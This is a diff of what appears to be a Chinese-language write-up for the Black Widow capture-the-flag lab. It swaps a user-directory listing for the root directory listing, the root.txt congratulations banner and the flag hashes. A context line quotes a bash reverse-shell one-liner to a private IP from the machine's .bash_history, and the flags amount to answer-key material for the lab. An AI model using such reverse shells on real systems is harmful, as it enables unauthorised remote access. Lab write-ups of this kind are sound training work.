@@ -689,20 +689,6 @@ uid=0(root) gid=1001(viper) groups=1001(viper)
 <img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506171326610.png" alt="image-20250617132507310" style="zoom:50%;" />
 
 ```bash
-root@blackwidow:~# ls -la
-total 40
-drwxr-xr-x 4 viper viper 4096 May  2  2021 .
-drwxr-xr-x 3 root  root  4096 Dec 12  2020 ..
-drwx------ 4 viper viper 4096 Dec 13  2020 backup_site
--rw------- 1 viper viper 1546 May  2  2021 .bash_history
--rw-r--r-- 1 viper viper  220 Dec 12  2020 .bash_logout
--rw-r--r-- 1 viper viper 3526 Dec 12  2020 .bashrc
-drwxr-xr-x 3 viper viper 4096 Dec 13  2020 .local
--rw------- 1 viper viper   33 Dec 12  2020 local.txt
--rw-r--r-- 1 viper viper  807 Dec 12  2020 .profile
--rw------- 1 viper viper   56 May  2  2021 .Xauthority
-root@blackwidow:~# cat local.txt 
-d930fe79919376e6d08972dae222526b
 root@blackwidow:~# cat .bash_history
 bash -i >& /dev/tcp/192.168.1.111/1234 0>&1
 sudo reboot
@@ -803,3 +789,43 @@ su root
 ```
 
 就是作者预期的！
+
+```bash
+root@blackwidow:/root# ls -la
+total 32
+drwx------  3 root root 4096 May  2  2021 .
+drwxr-xr-x 18 root root 4096 Dec 11  2020 ..
+lrwxrwxrwx  1 root root    9 Dec 12  2020 .bash_history -> /dev/null
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+drwxr-xr-x  3 root root 4096 Dec 12  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-------  1 root root   14 Dec 13  2020 .python_history
+-rw-------  1 root root  926 Apr 21  2021 root.txt
+-rw-r--r--  1 root root   66 May  2  2021 .selected_editor
+root@blackwidow:/root# cat root.txt 
+
+
+▄▄▄▄· ▄▄▌   ▄▄▄·  ▄▄· ▄ •▄     ▄▄▌ ▐ ▄▌▪  ·▄▄▄▄        ▄▄▌ ▐ ▄▌
+▐█ ▀█▪██•  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪    ██· █▌▐███ ██▪ ██ ▪     ██· █▌▐█
+▐█▀▀█▄██▪  ▄█▀▀█ ██ ▄▄▐▀▀▄·    ██▪▐█▐▐▌▐█·▐█· ▐█▌ ▄█▀▄ ██▪▐█▐▐▌
+██▄▪▐█▐█▌▐▌▐█ ▪▐▌▐███▌▐█.█▌    ▐█▌██▐█▌▐█▌██. ██ ▐█▌.▐▌▐█▌██▐█▌
+·▀▀▀▀ .▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀     ▀▀▀▀ ▀▪▀▀▀▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀ ▀▪
+
+
+Congrats!
+
+You've rooted Black Widow!
+
+0xJin - mindsflee
+Follow on Instagram: 0xjiin
+Follow on Twitter: 0xJin , @mindsflee
+
+
+0780eb289a44ba17ea499ffa6322b335
+
+
+root@blackwidow:/root# cat .python_history
+exti()
+exit()
+```
+
